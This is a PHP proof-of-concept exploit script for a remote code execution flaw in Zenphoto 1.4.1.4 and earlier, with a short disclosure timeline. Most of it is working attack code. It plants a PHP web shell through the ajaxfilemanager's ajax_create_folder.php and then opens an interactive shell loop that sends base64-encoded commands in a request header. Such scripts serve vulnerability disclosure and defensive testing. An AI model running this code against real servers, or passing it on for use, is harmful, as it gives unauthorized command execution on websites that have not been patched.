<?php

/*
    --------------------------------------------------------------------------
    Zenphoto <= 1.4.1.4 (ajax_create_folder.php) Remote Code Execution Exploit
    --------------------------------------------------------------------------

    author............: Egidio Romano aka EgiX
    mail..............: n0b0d13s[at]gmail[dot]com
    software link.....: http://www.zenphoto.org/

    +-------------------------------------------------------------------------+
    | This proof of concept code was written for educational purpose only.    |
    | Use it at your own risk. Author will be not responsible for any damage. |
    +-------------------------------------------------------------------------+

    [-] Vulnerability overview:

    All versions of Zenphoto from 1.2.4 to 1.4.1.4 are affected by the
    vulnerability that I reported to http://www.exploit-db.com/exploits/18075/

    [-] Disclosure timeline:

    [21/10/2011] - Vulnerability discovered
    [24/10/2011] - Issue reported to http://www.zenphoto.org/trac/ticket/2005
    [31/10/2011] - Fix released with version 1.4.1.5
    [05/11/2011] - Public disclosure

*/

error_reporting(0);
set_time_limit(0);
ini_set("default_socket_timeout", 5);

function http_send($host, $packet)
{
    if (!($sock = fsockopen($host, 80)))
        die( "\n[-] No response from {$host}:80\n");

    fwrite($sock, $packet);
    return stream_get_contents($sock);
}

print "\n+-----------------------------------------------------------+";
print "\n| Zenphoto <= 1.4.1.4 Remote Code Execution Exploit by EgiX |";
print "\n+-----------------------------------------------------------+\n";

if ($argc < 3)
{
    print "\nUsage......: php $argv[0] <host> <path>\n";
    print "\nExample....: php $argv[0] localhost /";
    print "\nExample....: php $argv[0] localhost /zenphoto/\n";
    die();
}

$host = $argv[1];
$path = $argv[2];

$payload = "foo=<?php error_reporting(0);print(_code_);passthru(base64_decode(\$_SERVER[HTTP_CMD]));die; ?>";
$packet  = "POST {$path}zp-core/zp-extensions/tiny_mce/plugins/ajaxfilemanager/ajax_create_folder.php HTTP/1.0\r\n";
$packet .= "Host: {$host}\r\n";
$packet .= "Content-Length: ".strlen($payload)."\r\n";
$packet .= "Content-Type: application/x-www-form-urlencoded\r\n";
$packet .= "Connection: close\r\n\r\n{$payload}";

http_send($host, $packet);

$packet  = "GET {$path}zp-core/zp-extensions/tiny_mce/plugins/ajaxfilemanager/inc/data.php HTTP/1.0\r\n";
$packet .= "Host: {$host}\r\n";
$packet .= "Cmd: %s\r\n";
$packet .= "Connection: close\r\n\r\n";

while(1)
{
    print "\nzenphoto-shell# ";
    if (($cmd = trim(fgets(STDIN))) == "exit") break;
    preg_match("/_code_(.*)/s", http_send($host, sprintf($packet, base64_encode($cmd))), $m) ?
    print $m[1] : die("\n[-] Exploit failed!\n");
}

?>